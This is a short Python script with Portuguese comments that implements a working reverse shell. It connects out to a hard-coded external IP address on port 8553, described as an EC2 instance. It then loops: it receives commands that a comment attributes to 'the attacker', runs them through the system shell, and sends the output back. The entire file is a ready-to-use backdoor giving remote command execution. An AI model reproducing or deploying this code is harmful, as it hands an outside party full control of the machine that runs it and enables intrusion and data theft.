import socket
import subprocess
import os

# Substitua pelo IP da sua instância EC2
server_ip = "3.148.177.247"
server_port = 8553
print(server_ip, server_port)
# Cria um socket e conecta ao servidor
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_ip, server_port))

while True:
    # Recebe o comando do atacante
    command = client.recv(1024).decode("utf-8")
    if command.lower() == "exit":
        break
    # Executa o comando e envia a saída de volta
    if command.startswith("cd "):
        try:
            os.chdir(command.strip("cd "))
            client.send(b"Changed directory")
        except FileNotFoundError as e:
            client.send(str(e).encode())
    else:
        output = subprocess.run(command, shell=True, capture_output=True)
        client.send(output.stdout + output.stderr)

client.close()
